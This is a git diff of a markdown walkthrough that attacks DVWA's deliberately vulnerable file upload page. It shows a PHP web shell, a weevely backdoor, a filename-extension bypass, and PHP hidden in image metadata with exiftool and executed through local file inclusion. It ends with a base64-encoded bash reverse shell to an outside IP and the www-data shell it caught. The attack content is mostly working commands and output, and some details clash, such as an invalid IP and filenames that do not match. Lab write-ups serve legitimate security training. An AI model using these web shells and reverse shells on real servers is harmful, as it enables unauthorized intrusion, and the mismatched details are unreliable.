@@ -42,33 +42,35 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 #### Shell.php
 
-1. Generate the shell: 
+1) Generate the shell: 
 ``` php
 <?php system($_GET["cmd"]); ?>
 ```
 
-2. Upload it to the webserver:
+2) Upload it to the webserver:
 ![image.png](/assets/images/posts/dvwa/file-upload/easy.png)
 
 > It can be seen that there is no validation for .php
 
-3. Call it in webserver: 
+3) Call it in webserver: 
 ![image.png](/assets/images/posts/dvwa/file-upload/easy-shell.png)
 ``/hackable/uploads/shell2.php?cmd=id``
 
 
 #### Weevely3
 
-1. Generate the shell: 
+> Source: [Weevely3](https://github.com/epinna/weevely3)
+
+1) Generate the shell: 
 ``` shell
 root@kali:~# weevely generate pas12 weevely-shell.php
 Generated 'weevely-shell.php' with password 'pas12' of 693 byte size.
 ```
 
-2. Upload it to the webserver:
+2) Upload it to the webserver:
 ![image.png](/assets/images/posts/dvwa/file-upload/weevely-shell.png)
 
-3. Call it in terminal: 
+3) Call it in terminal: 
 
 ``` shell
 root@kali:~# weevely http://127.0.0.1:4280/hackable/uploads/weevely-shell.php pas12
@@ -128,10 +130,10 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ?>
 ```
 
-1. When trying to upload the same script as before to the webserver, it fails as it now only accepts JPEG or PNG images.
+1) When trying to upload the same script as before to the webserver, it fails as it now only accepts JPEG or PNG images.
 ![image.png](/assets/images/posts/dvwa/file-upload/medium.png)
 
-2. This is easily bypassed by changing the file's name using Burp while uploading it. For example, rename `shell.php` to `shell.jpg` to bypass extension validation.
+2) This is easily bypassed by changing the file's name using Burp while uploading it. For example, rename `shell.jpg` to `shell.php` to bypass extension validation.
 ![image.png](/assets/images/posts/dvwa/file-upload/file-name.png)
 ![image.png](/assets/images/posts/dvwa/file-upload/file-name2.png)
 
@@ -181,7 +183,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 
 #### Phpinfo()
-1. Just changing metadata using exiftool:
+1) Just changing metadata using exiftool:
 
 ```bash
 root@kali:~# exiftool -DocumentName="<?php phpinfo(); die(); ?>" phpinfo.png
@@ -224,14 +226,15 @@ Image Size                      : 23x10
 Megapixels                      : 0.000230
 ```
 
-2. Upload it to the webserver:
+> Now we see Document Name  : <?php phpinfo(); die(); ?> 
 
-> Now we see Document Name  : <?php phpinfo(); die(); ?>
+2) Upload it to the webserver:
 
 ![image.png](/assets/images/posts/dvwa/file-upload/upload-phpinfo.png)
 
 
-3. Next, we set the security level back to low and execute our Local File Inclusion vulnerability at
+3) Next, we set the security level back to low and execute our Local File Inclusion vulnerability at
+
 
 > /vulnerabilities/fi/?page=../../hackable/uploads/phpinfo.png
 
@@ -247,25 +250,77 @@ Megapixels                      : 0.000230
 
 #### Via RCE
 
-1. Just changing metadata using exiftool:
+1) Just changing metadata using exiftool:
 
 ```bash
-exiftool -Comment="<?php system($_GET["cmd"]); ?>" polyglot.png -o jejes.php
+exiftool -Comment="<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>" jejes.png
 ```
 
-2. 
+
+2) Upload it to the webserver:
+
+> Changing filename into php.png 
+
+![image.png](/assets/images/posts/dvwa/file-upload/jejes.png)
+
+
+3) Next, we set the security level back to low and execute our Local File Inclusion vulnerability at
+
+> /vulnerabilities/fi/?page=../../hackable/uploads/shell.php.png
+
+![image.png](/assets/images/posts/dvwa/file-upload/shell-id.png)
+
+
+
+4) Setup revershell ip
+
+``` bash
+bash -i >& /dev/tcp/192.168.12.555/9001 0>&1
+```
+
+5) Set up the a listener 
+``` bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+```
+
+6) Encode url 
+
+> this is revershell after encode to base64 "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA+JjE="
+
+``` bash
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA+JjE=" | base64 -d | bash
+```
+
+![image.png](/assets/images/posts/dvwa/file-upload/url.png)
 
 
 
 
+7) Put url encode on shell
+
+``
+/fi/?page=../../hackable/uploads/jejes.php.png&cmd=echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEyMy85MDAxIDA%2BJjE%3D%22%20%7C%20base64%20-d%20%7C%20bash
+``
 
 
 
+8) Now we connect to RCE
 
 
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [192.168.22.11] from (UNKNOWN) [192.168.22.138] 59670
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bc264d5dbb36:/var/www/html/vulnerabilities/fi$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@bc264d5dbb36:/var/www/html/vulnerabilities/fi$ 
 
-
-
+```
 
 
 
